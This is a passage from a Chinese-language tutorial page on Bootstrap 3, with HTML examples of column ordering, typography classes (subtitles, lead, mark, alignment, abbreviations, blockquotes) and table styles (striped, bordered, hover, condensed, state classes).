class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="2-5-列排序"><a href="#2-5-列排序" class="headerlink" title="2.5 列排序"></a>2.5 列排序</h3><p>通过使用 <code>.col-md-push-*</code> 和 <code>.col-md-pull-*</code> 类就可以很容易的改变列（column）的顺序。</p><p>示例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;row&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-md-9 col-md-push-3&quot;</span>&gt;</span>.col-md-9 .col-md-push-3<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-md-3 col-md-pull-9&quot;</span>&gt;</span>.col-md-3 .col-md-pull-9<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="3-排版"><a href="#3-排版" class="headerlink" title="3.排版"></a>3.排版</h2><h3 id="3-1-副标题"><a href="#3-1-副标题" class="headerlink" title="3.1 副标题"></a>3.1 副标题</h3><p>在标题内还可以包含 <code>&lt;small&gt;</code> 标签或赋予 <code>.small</code> 类的元素，可以用来标记副标题。使用 <code>&lt;small&gt;</code> 标签包裹，其内的文本将被设置为父容器字体大小的 85%。标题元素中嵌套的 <code>&lt;small&gt;</code> 元素被设置不同的 <code>font-size</code> 。还可以为行内元素赋予 <code>.small</code> 类以代替任何 <code>&lt;small&gt;</code> 元素。</p><p>示例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>这是标题1<span class="hljs-tag">&lt;<span class="hljs-name">small</span>&gt;</span>这是副标题<span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;small&quot;</span>&gt;</span>这是副标题标题<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="3-2-中心内容"><a href="#3-2-中心内容" class="headerlink" title="3.2 中心内容"></a>3.2 中心内容</h3><p>通过添加 <code>.lead</code> 类可以让段落突出显示。</p><p>示例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;lead&quot;</span>&gt;</span>你好，世界！<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="3-3-标记文本"><a href="#3-3-标记文本" class="headerlink" title="3.3 标记文本"></a>3.3 标记文本</h3><p>使用标签<code>mark</code>。</p><p>示例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>这是一首<span class="hljs-tag">&lt;<span class="hljs-name">mark</span>&gt;</span>简单的<span class="hljs-tag">&lt;/<span class="hljs-name">mark</span>&gt;</span>歌<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="3-4-被删除的文本"><a href="#3-4-被删除的文本" class="headerlink" title="3.4 被删除的文本"></a>3.4 被删除的文本</h3><p>对于被删除的文本使用 <code>&lt;del&gt;</code> 标签。</p><p>示例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">del</span>&gt;</span>这是被删除的文本<span class="hljs-tag">&lt;/<span class="hljs-name">del</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="3-5-无用文本"><a href="#3-5-无用文本" class="headerlink" title="3.5 无用文本"></a>3.5 无用文本</h3><p>对于没用的文本使用 <code>&lt;s&gt;</code> 标签。<br>示例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">s</span>&gt;</span>这是无用的文本<span class="hljs-tag">&lt;/<span class="hljs-name">s</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="3-6-文本对齐"><a href="#3-6-文本对齐" class="headerlink" title="3.6 文本对齐"></a>3.6 文本对齐</h3><p>示例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;text-left&quot;</span>&gt;</span>Left aligned text.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;text-center&quot;</span>&gt;</span>Center aligned text.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;text-right&quot;</span>&gt;</span>Right aligned text.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span> //测试时为失效<br><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;text-justify&quot;</span>&gt;</span>Justified text.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;text-nowrap&quot;</span>&gt;</span>No wrap text.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="3-7-大小写切换"><a href="#3-7-大小写切换" class="headerlink" title="3.7 大小写切换"></a>3.7 大小写切换</h3><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;text-lowercase&quot;</span>&gt;</span>Lowercased text.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;text-uppercase&quot;</span>&gt;</span>Uppercased text.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;text-capitalize&quot;</span>&gt;</span>Capitalized text.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="3-8-缩略语"><a href="#3-8-缩略语" class="headerlink" title="3.8 缩略语"></a>3.8 缩略语</h3><p>当鼠标悬停在缩写和缩写词上时就会显示完整内容，Bootstrap 实现了对 HTML 的 <code>&lt;abbr&gt;</code> 元素的增强样式。缩略语元素带有 <code>title</code> 属性，外观表现为带有较浅的虚线框，鼠标移至上面时会变成带有“问号”的指针。如想看完整的内容可把鼠标悬停在缩略语上（对使用辅助技术的用户也可见）, 但需要包含 title 属性。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">abcdefghijklmno<span class="hljs-tag">&lt;<span class="hljs-name">abbr</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;attribute&quot;</span>&gt;</span>attr<span class="hljs-tag">&lt;/<span class="hljs-name">abbr</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="3-8-1-首字母缩略语"><a href="#3-8-1-首字母缩略语" class="headerlink" title="3.8.1 首字母缩略语"></a>3.8.1 首字母缩略语</h4><p>为缩略语添加 <code>.initialism</code> 类，可以让 font-size 变得稍微小些。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">abbr</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;HyperText Markup Language&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;initialism&quot;</span>&gt;</span>HTML<span class="hljs-tag">&lt;/<span class="hljs-name">abbr</span>&gt;<span class="hljs-name">abcdefghijkl</span></span><br></code></pre></div></td></tr></table></figure><h3 id="3-9-引用"><a href="#3-9-引用" class="headerlink" title="3.9 引用"></a>3.9 引用</h3><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">blockquote</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;blockquote-reverse&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer posuere erat a ante.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">footer</span>&gt;</span>Someone famous in <span class="hljs-tag">&lt;<span class="hljs-name">cite</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;Source Title&quot;</span>&gt;</span>Source Title<span class="hljs-tag">&lt;/<span class="hljs-name">cite</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">footer</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">blockquote</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>将任何 HTML 元素包裹在 <code>&lt;blockquote&gt;</code> 中即可表现为引用样式。对于直接引用，建议用 <code>&lt;p&gt;</code> 标签。添加 <code>&lt;footer&gt;</code> 用于标明引用来源。来源的名称可以包裹进 <code>&lt;cite&gt;</code>标签中。</p><p>通过赋予 <code>.blockquote-reverse</code> 类可以让引用呈现内容右对齐的效果。(测试时为失效)</p><h2 id="4-表格"><a href="#4-表格" class="headerlink" title="4.表格"></a>4.表格</h2><h3 id="4-1-基本实例"><a href="#4-1-基本实例" class="headerlink" title="4.1 基本实例"></a>4.1 基本实例</h3><p>为任意 <code>&lt;table&gt;</code> 标签添加 <code>.table</code> 类可以为其赋予基本的样式 — 少量的内补（padding）和水平方向的分隔线。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;table&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>id<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>name<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>class<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>grade<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="4-2-相间条纹状表格"><a href="#4-2-相间条纹状表格" class="headerlink" title="4.2 相间条纹状表格"></a>4.2 相间条纹状表格</h3><p>通过 <code>.table-striped</code> 类可以给 <code>&lt;tbody&gt;</code> 之内的每一行增加斑马条纹样式。(条纹状表格是依赖 <code>:nth-child</code> CSS 选择器实现的，而这一功能不被 Internet Explorer 8 支持。)</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;table table-striped&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>id<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>name<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>class<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>grade<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="4-3-带边框的表格"><a href="#4-3-带边框的表格" class="headerlink" title="4.3 带边框的表格"></a>4.3 带边框的表格</h3><p>添加 <code>.table-bordered</code> 类为表格和其中的每个单元格增加边框。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;table table-striped table-bordered&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>id<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>name<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>class<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>grade<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="4-4-鼠标悬停响应"><a href="#4-4-鼠标悬停响应" class="headerlink" title="4.4 鼠标悬停响应"></a>4.4 鼠标悬停响应</h3><p>通过添加 <code>.table-hover</code> 类可以让 <code>&lt;tbody&gt;</code> 中的每一行对鼠标悬停状态作出响应。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;table table-striped table-bordered table-hover&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>id<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>name<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>class<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>grade<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="4-5-紧缩表格"><a href="#4-5-紧缩表格" class="headerlink" title="4.5 紧缩表格"></a>4.5 紧缩表格</h3><p>通过添加 <code>.table-condensed</code> 类可以让表格更加紧凑，单元格中的内补（padding）均会减半。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;table table-condensed&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>id<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>name<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>class<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>grade<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="4-6-表格状态类"><a href="#4-6-表格状态类" class="headerlink" title="4.6 表格状态类"></a>4.6 表格状态类</h3><p>通过状态类可以为行或单元格设置颜色。</p><table><thead><tr><th align="left">Class</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><code>.active</code></td><td align="left">鼠标悬停在行或单元格上时所设置的颜色</td></tr><tr><td align="left"><code>.success</code></td><td align="left">标识成功或积极的动作</td></tr><tr><td align="left"><code>.info</code></td><td align="left">标识普通的提示信息或动作</td></tr><tr><td align="left"><code>.warning</code></td><td align="left">标识警告或需要用户注意</td></tr><tr><td align="left"><code>.danger</code></td><td align="left">标识危险或潜在的带来负面影响的动作</td></tr></tbody></table><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- On rows --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tr</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;active&quot;</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tr</span> <span class="hljs-attr">class</span>=<span 